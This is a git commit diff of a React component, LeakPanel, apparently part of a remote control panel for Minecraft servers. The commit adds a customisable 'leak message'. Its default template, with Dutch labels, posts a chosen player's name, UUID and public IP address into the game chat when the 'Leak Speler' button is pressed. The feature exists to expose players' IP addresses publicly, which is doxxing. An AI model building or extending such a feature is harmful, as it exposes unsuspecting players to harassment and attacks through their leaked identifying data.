ac4bf3ba53328df2c1126418d6a68716c328fd64
Alex <57497005+KingDevCode@users.noreply.github.com>
2022-07-26 13:05:21 +0200

    Custom leak message added

--- Client/src/pages/servercontrollers/playercontroller/features/panels/LeakPanel.tsx
+++ Client/src/pages/servercontrollers/playercontroller/features/panels/LeakPanel.tsx
@@ -1,14 +1,35 @@
-import { Tooltip } from '@mui/material';
+import { TextareaAutosize, Tooltip } from '@mui/material';
 import './PanelStyle.scss';
 import './LeakPanelStyle.scss';
 
 import { socket } from '../../../../../socket/socket';
 import { FaFileUpload } from 'react-icons/fa';
+import { useEffect, useState } from 'react';
 
 function LeakPanel(props: {Server: any, player: any;}){
+    const [message, setMessage] = useState<string[]>([]);
+
     function leakPlayer(){
-        socket.emit("feature:player", socket.id, props.Server.Servername, props.player.UUID, "leak", {});
+        socket.emit("feature:player", socket.id, props.Server.Servername, props.player.UUID, "leak", {"Message": message.toString()});
     }
+    function onMessageChange(e: any){
+        var splitted:string[] = e.target.value.split("\n");
+        setMessage(splitted)
+    }
+    useEffect(() => {
+        function loadText() {
+            setMessage([
+                "§4§lBELANGRIJK",
+                "§6§l§m--------------",
+                "§eDisplayname:§7 %displayname%",
+                "§eName:§7 %name%",
+                "§eUUID:§7 %uuid%",
+                "§ePublic IP:§c§l %ip%",
+                "§6§l§m--------------"
+            ])
+        }
+        loadText();
+    }, [])
     return (
         <>
             <div className='panel-header'>
@@ -17,6 +38,18 @@ function LeakPanel(props: {Server: any, player: any;}){
             <div className='panel-line'></div>
             <div className='leakpanel-container'>
                 <div className='leakpanel-buttons'>
+                    <textarea
+                        onChange={onMessageChange}
+                        value={message.map((line:string, index:number) => {
+                            if (index + 1 === message.length)
+                                return line;
+                            else
+                                return line + "\n";
+                        }).join("")}
+                        placeholder="Geef een leak message..."
+                        style={{ width: 300, height: 160, maxWidth: "100%", minWidth: 300, minHeight: 30 }}
+                    />
+                    <p>Volgende placeholders zijn beschikbaar:<br></br><span style={{color: "gray"}}>| %displayname% | %name% | %uuid% | %ip% |</span></p>
                     <Tooltip title='Leak de data van de speler in de chat' onClick={() => leakPlayer()}>
                         <div className='leakpanel-buttons-button'><FaFileUpload />Leak Speler</div>
                     </Tooltip>
